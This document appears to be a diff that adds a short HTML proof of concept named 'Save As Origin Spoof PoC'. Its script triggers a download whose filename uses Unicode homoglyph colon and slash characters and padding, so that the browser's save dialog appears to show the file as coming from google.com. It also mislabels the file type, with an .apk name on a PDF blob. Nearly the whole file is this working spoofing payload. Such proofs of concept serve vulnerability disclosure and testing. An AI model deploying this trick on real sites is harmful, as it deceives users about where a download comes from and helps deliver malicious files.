@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Save As Origin Spoof PoC</title>
+  <style>
+    body {
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-family: sans-serif;
+      background: #f9f9f9;
+    }
+
+    #saveButton {
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    #saveButton:hover {
+      background-color: #218838;
+    }
+
+    #result {
+      margin-top: 20px;
+      font-size: 15px;
+      color: #333;
+    }
+  </style>
+
+  <script>
+    function handleSaveAs() {
+      const fileContent = "Sensitive content.";
+      
+      // Using Unicode homoglyphs and special characters to spoof origin
+      const spoofedURL = "https⁚⧸⧸google.com"; // Unicode colon + double slash
+      const padding = "_".repeat(1); // Pushes spoofed domain into dialog visibility
+
+      const filename = `userdata_backup.apk${padding}From ${spoofedURL}`;
+      
+      const blob = new Blob([fileContent], { type: "application/pdf" });
+      const url = URL.createObjectURL(blob);
+      
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      
+      document.getElementById("result").innerText = `Attempted save as: ${filename}`;
+    }
+  </script>
+</head>
+<body>
+  <button id="saveButton" onclick="handleSaveAs()">Download File</button>
+  <div id="result">Waiting for interaction...</div>
+</body>
+</html>
